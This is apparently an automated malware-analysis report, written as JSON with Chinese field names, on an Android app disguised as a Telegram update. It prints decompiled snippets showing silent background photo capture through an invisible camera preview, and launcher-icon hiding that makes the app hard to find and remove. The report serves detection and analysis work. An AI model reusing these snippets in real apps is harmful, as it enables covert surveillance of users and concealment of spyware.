@@ -1,0 +1,80 @@
+{
+  "APK信息": {
+    "文件名": "a38b69304b1b8654de8a7f63a1dab7a5497552f59a45377ff4d749addebad873.apk",
+    "sha256": "a38b69304b1b8654de8a7f63a1dab7a5497552f59a45377ff4d749addebad873",
+    "包名": "com.systemappsy.update.telegram",
+    "应用名": "Telegram Update",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 219.9
+  },
+  "行为列表": [
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\systemappsy\\update\\telegram\\Handlers\\CameraManger;",
+          "method_signature": "if(this.cam == null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.holder = new SurfaceView(this.ctx).getHolder();\nthis.cam.setPreviewDisplay(this.holder);\nthis.cam.startPreview();\nthis.cam.takePicture(null, null, this.pic);",
+          "malicious_code_snippet_context": "              }\n              Looper.prepare();\n              try {\n>>>                 this.holder = new SurfaceView(this.ctx).getHolder();\n>>>                 this.cam.setPreviewDisplay(this.holder);\n>>>             } catch (IOException e) {\n>>>             }\n              this.cam.startPreview();\n              this.cam.takePicture(null, null, this.pic);\n              Looper.loop();",
+          "behavior_description": "代码在后台线程(Looper.prepare/loop)中秘密初始化摄像头，创建一个不可见的SurfaceView作为预览载体以满足Camera API要求，随后调用startPreview()启动预览并直接调用takePicture()静默拍照。整个过程无任何用户界面提示，拍摄的照片通过pic回调处理，疑似用于后续窃取上传。该类位于伪装为系统更新的包路径(com.systemappsy.update.telegram.Handlers.CameraManger)中，结合Telegram相关命名空间，极可能是通过Telegram API将偷拍照片上传至C2服务器的间谍软件行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\systemappsy\\update\\telegram\\MainActivity;",
+          "method_signature": "onBtn(View view)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(BuildConfig.APPLICATION_ID, \"com.systemappsy.update.telegram.MainActivity\"), 2, 1);\nThread.sleep(2000L);\nIntent intent = new Intent(\"android.intent.action.MAIN\");\nintent.addCategory(\"android.intent.category.HOME\");\nintent.setFlags(268435456);\nstartActivity(intent);",
+          "malicious_code_snippet_context": "  \n      public void onBtn(View view) {\n          try {\n>>>             getPackageManager().setComponentEnabledSetting(new ComponentName(BuildConfig.APPLICATION_ID, \"com.systemappsy.update.telegram.MainActivity\"), 2, 1);\n>>>         } catch (Exception e) {\n>>>         }\n>>>         try {\n>>>             Thread.sleep(2000L);\n>>>         } catch (Exception e2) {\n          }\n          Intent intent = new Intent(\"android.intent.action.MAIN\");\n          intent.addCategory(\"android.intent.category.HOME\");",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting 将自身 MainActivity 组件设置为 DISABLED(2)，使应用图标从启动器中隐藏；随后延时2秒并启动 HOME Intent 返回桌面，使用户难以发现和卸载恶意应用。数据流向：BuildConfig.APPLICATION_ID/硬编码组件名(source) → setComponentEnabledSetting 禁用 launcher 组件(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
